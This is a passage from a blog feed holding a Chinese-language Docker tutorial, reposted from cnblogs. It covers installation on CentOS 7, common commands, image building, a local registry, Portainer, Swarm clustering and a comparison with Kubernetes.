<p>汇总：<a href="https://www.cnblogs.com/uoyo/p/12167224.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/12167224.html</a></p>
</blockquote>
<a id="more"></a>]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Docker 实战总结]]></title>
      <url>/2019/12/19/DockerSummary/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/leozhanggg/p/12039953.html" target="_blank" rel="noopener">https://www.cnblogs.com/leozhanggg/p/12039953.html</a></p>
</blockquote>
<a id="more"></a>

<p><strong>目录</strong></p>
<ol>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-简介">Docker 简介</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-优势">Docker 优势</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-基本概念">Docker 基本概念</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-安装使用">Docker 安装使用</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-常用命令">Docker 常用命令</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-镜像构建">Docker 镜像构建</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-本地仓库">Docker 本地仓库</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-与图形管理工具-Portainer">Docker 图形管理工具 Portainer</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-与集群管理工具-Swarm">Docker 集群管理工具 Swarm</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-运维流程图">Docker 运维流程图</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-配置管理">Docker 配置管理</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-后续问题">Docker 后续问题</a></li>
<li><a href="https://tao-lol.top/2019/12/19/DockerSummary/#Docker-报错解决">Docker 报错解决</a></li>
</ol>
<h1 id="Docker-简介"><a href="#Docker-简介" class="headerlink" title="Docker 简介"></a>Docker 简介</h1><p>&emsp;&emsp;<strong>Docker 是一个开源的应用容器引擎，开发者可以打包自己的应用到容器里面，然后迁移到其他机器的 docker 应用中，可以实现快速部署。</strong><br>&emsp;&emsp;简单的理解，docker 就是一个软件集装箱化平台，就像船只、火车、卡车运输集装箱而不论其内部的货物一样，软件容器充当软件部署的标准单元，其中可以包含不同的代码和依赖项。<br>&emsp;&emsp;按照这种方式容器化软件，开发人员和 IT 专业人员只需进行极少修改或不修改，即可将其部署到不同的环境，如果出现的故障，也可以通过镜像，快速恢复服务。</p>
<figure class="image-box">
                <img src="1059616-20191109172555889-1603196756.png" alt title class>
                <p></p>
            </figure>

<h1 id="Docker-优势"><a href="#Docker-优势" class="headerlink" title="Docker 优势"></a>Docker 优势</h1><h2 id="特性优势"><a href="#特性优势" class="headerlink" title="特性优势"></a>特性优势</h2><figure class="image-box">
                <img src="1059616-20191109172604637-1990244867.png" alt title class>
                <p></p>
            </figure>

<h2 id="资源优势"><a href="#资源优势" class="headerlink" title="资源优势"></a>资源优势</h2><figure class="image-box">
                <img src="1059616-20191112151326588-965047543.png" alt title class>
                <p></p>
            </figure>

<h1 id="Docker-基本概念"><a href="#Docker-基本概念" class="headerlink" title="Docker 基本概念"></a>Docker 基本概念</h1><p>&emsp;&emsp;<strong>Client（客户端）</strong>：是 Docker 的用户端，可以接受用户命令和配置标识，并与 Docker daemon 通信。<br>&emsp;&emsp;<strong>Images（镜像）</strong>：是一个只读模板，含创建 Docker 容器的说明，它与操作系统的安装光盘有点像。<br>&emsp;&emsp;<strong>Containers（容器）</strong>：镜像的运行实例，镜像与容器的关系类比面向对象中的类和对象。<br>&emsp;&emsp;<strong>Registry（仓库）</strong>：是一个集中存储与分发镜像的服务。最常用的 Registry 是官方的 Docker Hub。</p>
<figure class="image-box">
                <img src="1059616-20191109172624159-620464653.png" alt title class>
                <p></p>
            </figure>

<h1 id="Docker-安装使用"><a href="#Docker-安装使用" class="headerlink" title="Docker 安装使用"></a>Docker 安装使用</h1><h2 id="操作系统：CentOS-7"><a href="#操作系统：CentOS-7" class="headerlink" title="操作系统：CentOS 7"></a>操作系统：CentOS 7</h2><ol>
<li><p>安装依赖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加软件源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo　　# 指定阿里云镜像源</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装 docker-ce（对系统内核有一定要求，centos6 不支持）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all  yum makecache fast        # 重新生成缓存</span><br><span class="line">yum -y install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置自启并启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191112154320701-108250532.png" alt title class>
                <p></p>
            </figure>

<h2 id="运行示例：Nginx"><a href="#运行示例：Nginx" class="headerlink" title="运行示例：Nginx"></a>运行示例：Nginx</h2><ol>
<li>搜索并下载镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search nginx</span><br><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191112154517806-1605394976.png" alt title class>
                <p></p>
            </figure>

<ol start="2">
<li>启动一个容器并映射端口到本地<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 --name Nginx nginx　　　　# 参数详解见下文</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191112154526743-736147967.png" alt title class>
                <p></p>
            </figure>

<ol start="3">
<li>访问本地映射端口<figure class="image-box">
                <img src="1059616-20191112154531659-814379855.png" alt title class>
                <p></p>
            </figure>

</li>
</ol>
<h1 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h1><h2 id="镜像控制"><a href="#镜像控制" class="headerlink" title="镜像控制"></a>镜像控制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">搜索镜像：docker  search  [OPTIONS]  TERM</span><br><span class="line">上传镜像：docker  push  [OPTIONS]  NAME[:TAG]</span><br><span class="line">下载镜像：docker  pull  [OPTIONS]  NAME[:TAG]</span><br><span class="line">提交镜像：docker  commit [OPTIONS]  CONTAINER  NAME[:TAG]</span><br><span class="line">构建镜像：docker  build  [OPTIONS]  PATH</span><br><span class="line">删除镜像：docker  rmi [OPTIONS]  IMAGE  [IMAGE...]</span><br><span class="line">增加镜像标签：docker  tag  SOURCE_IMAGE[:TAG]  TARGET_IMAGE[:TAG]</span><br><span class="line">查看所有镜像：docker  images  [OPTIONS]  [REPOSITORY[:TAG]]</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="1059616-20191112155412834-338762946.png" alt title class>
                <p></p>
            </figure>

<h2 id="容器控制"><a href="#容器控制" class="headerlink" title="容器控制"></a>容器控制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动/重启容器：docker start/restart CONTAINER</span><br><span class="line">停止/强停容器：docker stop/ kill CONTAINER</span><br><span class="line">删除容器：docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">重命名容器：docker rename CONTAINER CONTAINER_NEW</span><br><span class="line">进入容器：docker attach CONTAINER</span><br><span class="line">执行容器命令：docker exec CONTAINER COMMAND</span><br><span class="line">查看容器日志：docker logs [OPTIONS] CONTAINER</span><br><span class="line">查看容器列表：docker ps [OPTIONS]</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="1059616-20191112155423874-350386050.png" alt title class>
                <p></p>
            </figure>

<h2 id="容器启动"><a href="#容器启动" class="headerlink" title="容器启动"></a>容器启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker  run  [OPTIONS]  IMAGE  [COMMAND]  [ARG...]</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-d</code>：后台运行容器，并返回容器 ID</li>
<li><code>-i</code>：以交互模式运行容器，通常与 <code>-t</code> 同时使用</li>
<li><code>-t</code>：为容器重新分配一个伪输入终端，通常与 <code>-i</code> 同时使用</li>
<li><code>-v</code>：绑定挂载目录</li>
<li><code>--name=&quot;mycontainer&quot;</code>：为容器指定一个名称</li>
<li><code>--net=&quot;bridge&quot;</code>：指定容器的网络连接类型，支持如下：<br><code>bridge</code> / <code>host</code> / <code>none</code> / <code>container:&lt;name|id&gt;</code></li>
<li><code>-p</code>/<code>-P</code>：端口映射，格式如图：<figure class="image-box">
                <img src="1059616-20191112155237442-1935865842.png" alt title class>
                <p></p>
            </figure>

</li>
</ul>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看 docker 信息：docker info</span><br><span class="line">docker 命令帮助：docker run --help</span><br><span class="line">复制文件到容器：docker cp custom.conf Nginx:/etc/nginx/conf.d/</span><br><span class="line">更新容器启动项：docker container update --restart=always nginx</span><br><span class="line">查看 docker 日志：tail -f /var/log/messages</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="1059616-20191112161415759-1267729284.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>更多可以参考官网：<a href="https://docs.docker.com/engine/reference/commandline/cli/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/cli/</a> </p>
<figure class="image-box">
                <img src="1059616-20191214150000098-1909876776.png" alt title class>
                <p></p>
            </figure>
</blockquote>
<h1 id="Docker-镜像构建"><a href="#Docker-镜像构建" class="headerlink" title="Docker 镜像构建"></a>Docker 镜像构建</h1><h2 id="Docker-commit（1-运行-2-修改-3-保存）"><a href="#Docker-commit（1-运行-2-修改-3-保存）" class="headerlink" title="Docker commit（1 运行 2 修改 3 保存）"></a>Docker commit（1 运行 2 修改 3 保存）</h2><ol>
<li><p>运行容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit -p 8080:80 --name Nginx nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改容器（这里我只是做个演示，所以就复制一下文件，具体修改需要根据你实际情况）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp custom.conf Nginx:/etc/nginx/conf.d/</span><br></pre></td></tr></table></figure>
</li>
<li><p>将容器保存为新的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit Nginx zwx/nginx</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191112155640841-516876073.png" alt title class>
                <p></p>
            </figure>

<h2 id="Dockerfile（1-编写-2-构建）"><a href="#Dockerfile（1-编写-2-构建）" class="headerlink" title="Dockerfile（1 编写 2 构建）"></a>Dockerfile（1 编写 2 构建）</h2><ol>
<li>编写 Dockerfile 文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191112155736158-842820092.png" alt title class>
                <p></p>
            </figure>

<ol start="2">
<li>执行 Dockerfile 文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t zwx/nginx .　　　　# 后面有个点，代表当前目录下 dockerfile 文件</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191112155724434-463914884.png" alt title class>
                <p></p>
            </figure>

<ol start="3">
<li>Dockerfile 常用指令<figure class="image-box">
                <img src="1059616-20191112155749441-1705248710.png" alt title class>
                <p></p>
            </figure>

</li>
</ol>
<blockquote>
<p>更多可以参考：<a href="https://www.cnblogs.com/leozhanggg/p/11820214.html" target="_blank" rel="noopener">【转载】Dockerfile 文件详解</a></p>
</blockquote>
<h1 id="Docker-本地仓库"><a href="#Docker-本地仓库" class="headerlink" title="Docker 本地仓库"></a>Docker 本地仓库</h1><ol>
<li><p>拉取镜像仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search registry</span><br><span class="line">docker pull registry</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动镜像服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit \</span><br><span class="line">--name=Registry \　　　　# 指定容器名称</span><br><span class="line">-p 5000:5000 \　　　　　　# 仓库默认端口是 5000，映射到宿主机，这样可以使用宿主机地址访问</span><br><span class="line">--restart=always \                # 自动重启，这样每次 docker 重启后仓库容器也会自动启动</span><br><span class="line">--privileged=true \              # 增加安全权限，一般可不加</span><br><span class="line">-v /usr/local/my_registry:/var/lib/registry  \　　　　# 把仓库镜像数据保存到宿主机</span><br><span class="line">registry</span><br></pre></td></tr></table></figure>
</li>
<li><p>注册 https 协议（需要通过本地仓库下载镜像，均需要配置）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json　　　　　　　　# 默认无此文件，需自行添加，有则追加一下内容。</span><br><span class="line">   &#123; &quot;insecure-registries&quot;:[&quot; xx.xx.xx.xx:5000&quot;] &#125;　　# 指定 ip 地址或域名</span><br></pre></td></tr></table></figure>
</li>
<li><p>新增 tag 指明仓库地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag zwx/nginx x.xx.xx.xx:5000/zwx/nginx　　# 如果构建时已经指定仓库地址，则可以省略</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传镜像到本地仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push x.xx.xx.xx:5000/zwx/nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看本地仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET http://x.xx.xx.xx:5000/v2/_catalog</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191112160214624-1466104232.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>更多可以参考：<a href="https://www.jianshu.com/p/8f38f198724e" target="_blank" rel="noopener">docker 搭建本地私有仓库</a></p>
</blockquote>
<h1 id="Docker-与图形管理工具-Portainer"><a href="#Docker-与图形管理工具-Portainer" class="headerlink" title="Docker 与图形管理工具 Portainer"></a>Docker 与图形管理工具 Portainer</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&emsp;&emsp;Portainer 是 Docker 的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm 集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。</p>
<figure class="image-box">
                <img src="1059616-20191112153539731-1511928488.png" alt title class>
                <p></p>
            </figure>

<h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><ol>
<li><p>搜索并下载镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search portainer</span><br><span class="line">docker pull portainer/portainer</span><br></pre></td></tr></table></figure>
</li>
<li><p>单机方式运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-p 9000:9000 \　　　# portainer 默认端口是 9000，映射到本地 9000 端口，通过本地地址访问</span><br><span class="line">--restart=always \　　# 设置自动重启</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock \　　# 单机必须指定docker.sock</span><br><span class="line">--name Prtainer portainer/portainer</span><br></pre></td></tr></table></figure>
</li>
<li><p>访问<a href="http://localhost:9000" target="_blank" rel="noopener">http://localhost:9000</a><br>&emsp;&emsp;<strong>首次登陆需要注册用户，给 admin 用户设置密码，然后单机版选择 local 连接即可。</strong></p>
<figure class="image-box">
                <img src="1059616-20191112153230740-1138499583.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>控制管理</p>
<figure class="image-box">
                <img src="1059616-20191112153611631-1158270908.png" alt title class>
                <p></p>
            </figure>

</li>
</ol>
<blockquote>
<p>更多可以参考：<a href="https://www.cnblogs.com/river2005/p/8283700.html" target="_blank" rel="noopener">Portainer 介绍</a></p>
</blockquote>
<h1 id="Docker-与集群管理工具-Swarm"><a href="#Docker-与集群管理工具-Swarm" class="headerlink" title="Docker 与集群管理工具 Swarm"></a>Docker 与集群管理工具 Swarm</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>&emsp;&emsp;Swarm 是 Docker 官方提供的一款集群管理工具，其主要作用是把若干台 Docker 主机抽象为一个整体，并且通过一个入口统一管理这些 Docker 主机上的各种 Docker 资源。</p>
<figure class="image-box">
                <img src="1059616-20191112152657240-1084437635.png" alt title class>
                <p></p>
            </figure>

<h2 id="安装使用-1"><a href="#安装使用-1" class="headerlink" title="安装使用"></a>安装使用</h2><p>&emsp;&emsp;Swarm 在 Docker 1.12 版本之前属于一个独立的项目，在 Docker 1.12 版本发布之后，该项目合并到了 Docker 中，成为 Docker 的一个子命令。</p>
<ol>
<li>启动 swarm 集群只需要执行初始化命令即可：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker swarm init \　　　　　　　# 默认初始化节点为管理节点</span><br><span class="line">--advertise-addr xx.xx.xx.xx \　　　#指定使用的 ip</span><br><span class="line">--listen-addr xx.xx.xx.xx:2377　　　#指定监听 ip 和 port，默认为 2377</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191128171456606-615353300.png" alt title class>
                <p></p>
            </figure>

<ol start="2">
<li><p>设置 manager 节点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker swarm join-token manager　　　　#获取管理节点 token，放入下面命令</span><br><span class="line">docker swarm join \</span><br><span class="line">--advertise-addr xx.xx.xx.xx \</span><br><span class="line">--listen-addr xx.xx.xx.xx:2377 \</span><br><span class="line">--token SWMTKN-1-29ynh5uyfiiospy4fsm4pd4xucyji2rn0oj4b4ak4s7a37syf9-ajkrv2ctjr5cmxzuij75tbrmz \</span><br><span class="line">xx.xx.xx.xx:2377</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置 worker 节点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker swarm join-token worker　　　　#获取工作节点 token，放入下面命令</span><br><span class="line">docker swarm join \</span><br><span class="line">--advertise-addr xx.xx.xx.xx \</span><br><span class="line">--listen-addr xx.xx.xx.xx:2377 \</span><br><span class="line">--token SWMTKN-1-29ynh5uyfiiospy4fsm4pd4xucyji2rn0oj4b4ak4s7a37syf9-ajkrv2ctjr5cmxzuij75tbrmz \</span><br><span class="line">xx.xx.xx.xx:2377</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看节点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker node ls</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1059616-20191128172311278-1473171098.png" alt title class>
                <p></p>
            </figure>

<ol start="5">
<li>创建服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker service create [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">          --detach , -d:  指定容器运行于前台还是后台，默认为 false</span><br><span class="line">          --name:  服务名称</span><br><span class="line">          --network:  网络连接</span><br><span class="line">          --publish , -p:  端口映射</span><br><span class="line">          --env , -e:  设置环境变量</span><br><span class="line">          --tty , -t:  分配 tty 设备，该可以支持终端登录</span><br><span class="line">          --mount:  文件挂载</span><br><span class="line">          --replicas:  指定任务数量</span><br></pre></td></tr></table></figure>

</li>
</ol>
<blockquote>
<p>更多参考：<a href="https://www.jianshu.com/p/028b40ca4f2a" target="_blank" rel="noopener">Docker Swarm 集群部署实践</a>&emsp;&emsp;<a href="https://www.cnblogs.com/xiangsikai/p/9935814.html" target="_blank" rel="noopener">Docker Swarm 常用命令</a></p>
</blockquote>
<h2 id="对比K8s究竟有何异同？"><a href="#对比K8s究竟有何异同？" class="headerlink" title="对比K8s究竟有何异同？"></a>对比K8s究竟有何异同？</h2><ol>
<li><strong>出生不同</strong><br>&emsp;&emsp;Google 根据其在 Linux 上容器管理经验，改造到 docker 管理上，就是 kubernetes。他的在许多方面表现良好,最重要的是构造于 Google 多年的宝贵经验之上。<br>&emsp;&emsp;kubernetes 并不是为了 docker 写的，kubernetes 把集群带到了一个全新的高度，代价是学习曲线比较陡。docker-swarm 使用了一个不同的方式,它是 docker 原生的集群工具。<br>&emsp;&emsp;最方便的部分是它暴露了 docker 标准的编程接口，意味着你之前一直在使用的任何与 docker 沟通的工具（docker CLI,  docker compose 等），都可以无缝的在 docker swarm 上使用。</li>
<li><strong>安装配置不同</strong><br>&emsp;&emsp;安装设置 swarm 非常简单，简单明了并且很灵活。我们需要做的就是安装一个服务发现工具，然后在所有的节点上安装 swarm 容器。<br>&emsp;&emsp;相比较而言，kubernetes 的安装就有点复杂晦涩了。不同的操作系统上安装都不同。每个操作系统都有自己的独立安装指令。</li>
<li><strong>运行方式不同</strong><br>&emsp;&emsp;使用 Swarm 和使用容器没有什么不同。比如，你习惯于使用 Docker CLI（命令行接口），你可以继续使用几乎相同的命令。<br>&emsp;&emsp;如果你习惯于使用 Docker Componse 来运行容器，你可以继续在 Swarm 集群中使用。不管你之前习惯于怎么使用容器，你仍旧可以使用，只是在更大级别的集群中使用。<br>&emsp;&emsp;Kubernetes 要求你去学习它自己的 CLI（命令行接口）和配置。你不能使用你之前创建的 docker-compose.yml 配置，你必须要去新建与 Kubernetes 对应的配置。<br>&emsp;&emsp;你也不能使用之前学习的 Docker CLI（命令行接口）。你必须要去学习 Kubernetes CLI（命令行接口）</li>
</ol>
<p>&emsp;&emsp;<strong>最后，当需要在 Docker Swarm 和 Kubernetes 做出选择时，可以考虑如下几点：</strong><br>&emsp;&emsp;你是否想依赖于 Docker 自己来解决集群的问题。如果是，选择 Swarm。如果某些功能在 Docker 中不支持，那它也非常可能在 Swarm 中找不到，因为 Swarm 是依赖于 Docker API 的。<br>&emsp;&emsp;另外一方面，如果你想要一个工具可以解决 Docker 的限制，Kubernetes 将是不错的选择。Kubernetes 不是基于 Docker，而是基于 Google 多年对于管理容器的经验。它是按照自己的方式来行事。  </p>
<h1 id="Docker-运维流程图"><a href="#Docker-运维流程图" class="headerlink" title="Docker 运维流程图"></a>Docker 运维流程图</h1><figure class="image-box">
                <img src="1059616-20191112152457727-1393157662.png" alt title class>
                <p></p>
            </figure>

<h1 id="Docker-配置管理"><a href="#Docker-配置管理" class="headerlink" title="Docker 配置管理"></a>Docker 配置管理</h1><h2 id="用了容器以后，还需要配置管理吗？"><a href="#用了容器以后，还需要配置管理吗？" class="headerlink" title="用了容器以后，还需要配置管理吗？"></a>用了容器以后，还需要配置管理吗？</h2><p>&emsp;&emsp;起初我们跟 Docker 官方一样，属于理想主义派。天真的认为容器就应该是 inmutable 的，当需要配置变更的时候，重新构建镜像重新部署。<br>&emsp;&emsp;基于这一思路，我们在 cSphere 中添加了个镜像自动构建模块，用户可以配置代码仓库的地址。<br>&emsp;&emsp;服务的配置文件保存于 Git 或者 SVN 库中，需要配置变更时，向版本库中 Push 一下，自动通过 hook 触发镜像构建，并自动完成线上容器的重建。<br>&emsp;&emsp;通过这套系统，用户可以非常方便的批量更新线上的服务，并不局限于配置文件的变更，代码的变更也天生支持。<br>&emsp;&emsp;经过实际使用，这套系统能够很好的满足开发和测试环境的需求，提升工作效率。<br>&emsp;&emsp;<strong>但是，在生产环境中使用的时候，我们发现这种流程其实并不那么完美，主要表现在：</strong><br>&emsp;&emsp;镜像构建和部署虽然自动化了，但构建是针对 VCS 中的某个仓库的，改一行配置就得整体重新构建一下，在更新容器时还需要把镜像重新分发到所有机器上，配置变更速度太慢。<br>&emsp;&emsp;这种方式的配置变更会涉及到服务的重启，这在生产环境某些场景下是不可接受的 ，有可能引起短暂的服务中断。  </p>
<h2 id="应用配置文件应该需要做到什么？"><a href="#应用配置文件应该需要做到什么？" class="headerlink" title="应用配置文件应该需要做到什么？"></a>应用配置文件应该需要做到什么？</h2><p>&emsp;&emsp;Docker 应用配置文件能够保持能够支持针对不同环境作出更改。另外配置文件支持在线更改，重启就生效。一般分为以下两种方式。</p>
<ol>
<li><strong>Docker 环境变量</strong><br>&emsp;&emsp;需要在制作镜像的时候就需要提前想好，有哪些参数是部署容器的时候会经常更改，<br>&emsp;&emsp;然后把这些参数抽出来做成容器的环境变量，然后在部署的容器的时候填入不同的参数即可。<br>&emsp;&emsp;但是如果后续发现有一些参数不同场景下部署的时候也会修改，那就需要再重新制作镜像了。</li>
<li><strong>应用配置文件</strong><br>&emsp;&emsp;上述的管理方式不太灵活，灵活的管理方式是将配置文件和镜像剥离开，这样就不会被镜像给绑定了。<br>&emsp;&emsp;<strong>注：最新版本可以参考 docker config 命令管理</strong></li>
</ol>
<h1 id="Docker-后续问题"><a href="#Docker-后续问题" class="headerlink" title="Docker 后续问题"></a>Docker 后续问题</h1><ul>
<li>集群环境</li>
<li>网络安全</li>
<li>存储管理</li>
<li>日志收集</li>
<li>实时监控</li>
<li>性能调优</li>
<li>……</li>
</ul>
<h1 id="Docker-报错解决"><a href="#Docker-报错解决" class="headerlink" title="Docker 报错解决"></a>Docker 报错解决</h1><p><a href="https://www.cnblogs.com/leozhanggg/p/11730189.html" target="_blank" rel="noopener">【解决】Got permission denied while trying to connect to the Docker daemon socket at……dial unix /var/run/docker.sock: permission denied</a><br><a href="https://www.cnblogs.com/leozhanggg/p/12031433.html" target="_blank" rel="noopener">【解决】error pulling image configuration: Get https:// …… x509: certificate has expired or is not yet valid</a><br><a href="https://www.cnblogs.com/leozhanggg/p/12023531.html" target="_blank" rel="noopener">【解决】image … could not be accessed on a registry to record its digest.</a><br><a href="https://www.cnblogs.com/leozhanggg/p/12023456.html" target="_blank" rel="noopener">【解决】http: server gave HTTP response to HTTPS client</a><br><a href="https://www.cnblogs.com/leozhanggg/p/12023429.html" target="_blank" rel="noopener">【解决】OCI runtime exec failed……executable file not found in $PATH”: unknown</a><br>更多报错解决方案持续更新中：<a href="https://www.cnblogs.com/leozhanggg/p/11796810.html" target="_blank" rel="noopener">【解决】Docker Errors</a>  </p>
<hr>
<blockquote>
